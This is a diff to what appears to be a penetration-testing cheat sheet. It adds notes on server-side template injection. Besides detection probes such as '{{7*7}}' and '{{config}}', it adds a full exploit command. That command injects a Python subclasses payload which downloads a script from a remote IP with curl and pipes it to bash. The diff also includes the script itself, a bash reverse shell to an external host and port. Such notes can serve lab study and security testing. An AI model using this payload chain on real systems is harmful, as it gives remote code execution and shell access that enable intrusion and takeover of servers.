@@ -2778,6 +2778,7 @@ Windows Defender might tag the application as virus.
 
 
 ### <ins>Server-side template injection</ins>
+- SSTI
 
 - Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. To identify the template engine submit invalid syntax to cause an error message.
 - The next step is look for the documentation to see how you can exploit the vulnerable endpoints and known vulnerabilities/exploits.
@@ -2793,7 +2794,13 @@ Windows Defender might tag the application as virus.
   #{7*7}
   #{ 7 * 7 }
   ```
-
+- test '{{7*7}}', if the result is 49, then we can proceed with more tests
+- try then `{{config}}` and `{{{{{}.__class__.__base__.__subclasses__()}}}}`
+- `python3 client.py '{{{}.__class__.__base__.__subclasses__()[400]("curl 192.168.45.237/shell.sh | bash", shell=True, stdout=-1).communicate()[0].decode()}}'`
+  - shell.sh
+    ```bash
+    bash -i >& /dev/tcp/192.168.118.9/8080 0>&1
+    ```
 
 
 ### <ins>Web cache poisoning</ins>
